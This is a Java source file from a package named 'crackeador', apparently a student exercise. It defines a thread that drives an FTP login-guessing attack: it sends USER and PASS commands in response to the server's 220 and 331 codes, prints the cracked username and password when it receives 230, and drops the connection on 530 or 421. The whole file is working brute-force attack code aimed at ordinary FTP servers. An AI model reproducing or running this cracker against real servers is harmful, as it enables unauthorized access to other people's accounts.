package crackeador;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
/**
 *
 * @author dam2
 */
public class HebraEscritora extends Thread {

    LinkedList<String> mensajes;
    Socket socket;
    String usuario;
    String pass;
    boolean conexLim;

    public HebraEscritora() {
    }

    public HebraEscritora(LinkedList<String> mensajes, Socket socket, String usuario, String pass) {
        this.mensajes = mensajes;
        this.socket = socket;
        this.usuario = usuario;
        this.pass = pass;
        this.conexLim = false;
    }

    @Override
    public void run() {
        String respuesta = "";
        PrintWriter escribir = null;

        try {
            escribir = new PrintWriter(socket.getOutputStream(), true);

        } catch (IOException ex) {
            Logger.getLogger(HebraEscritora.class.getName()).log(Level.SEVERE, null, ex);
        }

        while (socket.isConnected()) {

            while (mensajes.size() > 0) {
                respuesta = mensajes.pop();
            }

            if (respuesta.contains("421")) {
                conexLim = true;
                try {
                    socket.close();
                } catch (IOException ex) {
                    Logger.getLogger(HebraEscritora.class.getName()).log(Level.SEVERE, null, ex);
                }
            }

            if (respuesta.contains("230")) {
                System.out.println("Has entrado: El usuario " + usuario
                        + " con la contraseña correcta es: " + pass);
                try {
                    socket.close();
                } catch (IOException ex) {
                    Logger.getLogger(HebraEscritora.class.getName()).log(Level.SEVERE, null, ex);
                }
            }

            if (respuesta.contains("530")) {
                try {
                    socket.close();
                } catch (IOException ex) {
                    Logger.getLogger(HebraEscritora.class.getName()).log(Level.SEVERE, null, ex);
                }
            }

            if (respuesta.contains("220")) {
                escribir.println("user " + usuario);
                
            }

            if (respuesta.contains("331")) {
                escribir.println("pass " + pass);
            }
        }

    }

    public LinkedList<String> getMensajes() {
        return mensajes;
    }

    public Socket getSocket() {
        return socket;
    }

    public String getUsuario() {
        return usuario;
    }

    public String getPass() {
        return pass;
    }

    public boolean isConexLim() {
        return conexLim;
    }

}
